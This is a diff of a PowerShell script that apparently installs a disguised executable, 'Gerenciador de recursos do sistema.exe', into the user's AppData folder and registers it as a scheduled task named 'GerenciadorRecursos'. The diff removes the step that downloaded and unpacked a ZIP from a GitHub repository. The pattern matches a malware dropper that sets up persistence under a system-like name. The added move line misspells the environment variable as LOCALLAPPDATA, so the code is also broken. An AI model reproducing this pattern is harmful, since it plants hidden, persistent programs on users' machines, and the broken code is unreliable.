@@ -1,11 +1,8 @@
-Invoke-RestMethod "https://github.com/n0shadow/config/raw/refs/heads/main/Server.zip" -OutFile "a.zip";
-Expand-Archive -Path "a.zip" -DestinationPath ".";
-Remove-Item "a.zip";
 $usrPath = $PWD.Path
 $usr = Split-Path $usrPath -Leaf
 $dest = Join-Path $usrPath "AppData\Local\Server"
+Move-Item $env:LOCALLAPPDATA\Server $dest -Force
 $exec = Join-Path $dest "Gerenciador de recursos do sistema.exe"
-Move-Item "Server" $dest -Force
 
 $realDmn = (Get-WmiObject Win32_ComputerSystem).PartOfDomain
 $dmn = if ($realDmn) {
@@ -16,6 +13,8 @@ $dmn = if ($realDmn) {
 
 $acc = "$dmn\$usr"
 $tsk = "GerenciadorRecursos"
+
+schtasks /delete /tn $tsk /f
 
 schtasks.exe /create `
     /tn $tsk `
